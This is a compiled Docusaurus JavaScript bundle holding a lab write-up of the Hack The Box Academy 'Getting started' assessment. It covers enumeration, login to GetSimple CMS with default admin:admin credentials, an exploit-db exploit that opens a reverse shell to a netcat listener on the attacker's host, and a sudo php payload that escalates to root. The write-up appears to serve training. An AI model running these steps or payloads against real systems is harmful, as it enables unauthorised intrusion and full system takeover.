"use strict";(self.webpackChunkhacking=self.webpackChunkhacking||[]).push([[828],{4091:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>r,default:()=>h,frontMatter:()=>i,metadata:()=>o,toc:()=>c});var s=t(5893),a=t(1151);const i={slug:"/write-up/htb-academy/getting-started",pagination_next:null,pagination_prev:null},r=void 0,o={id:"Write-ups/Academy/Getting started",title:"Getting started",description:"This is the write-up for the assessment of HTB academy Getting started module.",source:"@site/docs/Write-ups/Academy/Getting started.md",sourceDirName:"Write-ups/Academy",slug:"/write-up/htb-academy/getting-started",permalink:"/hacking/write-up/htb-academy/getting-started",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{slug:"/write-up/htb-academy/getting-started",pagination_next:null,pagination_prev:null},sidebar:"tutorialSidebar"},d={},c=[{value:"Enumeration",id:"enumeration",level:2},{value:"Foothold",id:"foothold",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}];function l(e){const n={a:"a",code:"code",h2:"h2",p:"p",pre:"pre",...(0,a.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(n.p,{children:["This is the write-up for the assessment of HTB academy ",(0,s.jsx)(n.a,{href:"https://academy.hackthebox.com/module/details/77",children:"Getting started"})," module."]}),"\n",(0,s.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,s.jsx)(n.p,{children:"The machine has open ports in 22 and 80"}),"\n",(0,s.jsxs)(n.p,{children:["SSH banner: ",(0,s.jsx)(n.code,{children:"OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0"})]}),"\n",(0,s.jsx)(n.p,{children:"There's an apache webserver in 80:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"PORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Welcome to GetSimple! - gettingstarted\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n| http-robots.txt: 1 disallowed entry \n|_/admin/\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500\u2500\u257c $whatweb http://10.129.235.190/\nhttp://10.129.235.190/ [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.235.190], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]\n"})}),"\n",(0,s.jsxs)(n.p,{children:["From the previous scans we can see it's using the ",(0,s.jsx)(n.code,{children:"GetSimple"})," cms."]}),"\n",(0,s.jsx)(n.h2,{id:"foothold",children:"Foothold"}),"\n",(0,s.jsxs)(n.p,{children:["We search the default credentials and ",(0,s.jsx)(n.code,{children:"admin:admin"})," worked."]}),"\n",(0,s.jsxs)(n.p,{children:["Checking the vulnerabilities for the CMS, I found this one ",(0,s.jsx)(n.a,{href:"https://www.exploit-db.com/exploits/51475",children:"https://www.exploit-db.com/exploits/51475"}),"."]}),"\n",(0,s.jsx)(n.p,{children:"Then, it's a matter of download the exploit, run it and configure a remote shell using nc:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -lvnp 4444\n"})}),"\n",(0,s.jsx)(n.p,{children:"and launch the exploit:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"python3 51475.py 10.129.235.190 / 10.10.15.50:4444 admin\n"})}),"\n",(0,s.jsxs)(n.p,{children:["And we have foothold onto the machine with ",(0,s.jsx)(n.code,{children:"www-data"})," user:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.15.50] from (UNKNOWN) [10.129.235.190] 52682\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n"})}),"\n",(0,s.jsx)(n.p,{children:"Now, we just need to improve the shell and retrieve the user flag."}),"\n",(0,s.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege escalation"}),"\n",(0,s.jsx)(n.p,{children:"Now, we can escalate privileges. First we check what root permissions have the user:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"www-data@gettingstarted:/home/mrb3n$ sudo -l\nsudo -l\nMatching Defaults entries for www-data on gettingstarted:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on gettingstarted:\n    (ALL : ALL) NOPASSWD: /usr/bin/php\n"})}),"\n",(0,s.jsxs)(n.p,{children:["The user ",(0,s.jsx)(n.code,{children:"www-data"})," can execute the ",(0,s.jsx)(n.code,{children:"php"})," binary as root without providing a password. This is a very bad idea. A quick search in GTFObins give a easy payload to get a root shell:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"www-data@gettingstarted:/home/mrb3n$ sudo php -r 'system(\"/bin/sh\");'\nsudo php -r 'system(\"/bin/sh\");'\nid\nid\nuid=0(root) gid=0(root) groups=0(root)\n"})}),"\n",(0,s.jsx)(n.p,{children:"Now we can retrieve the root flag."})]})}function h(e={}){const{wrapper:n}={...(0,a.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},1151:(e,n,t)=>{t.d(n,{Z:()=>o,a:()=>r});var s=t(7294);const a={},i=s.createContext(a);function r(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:r(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);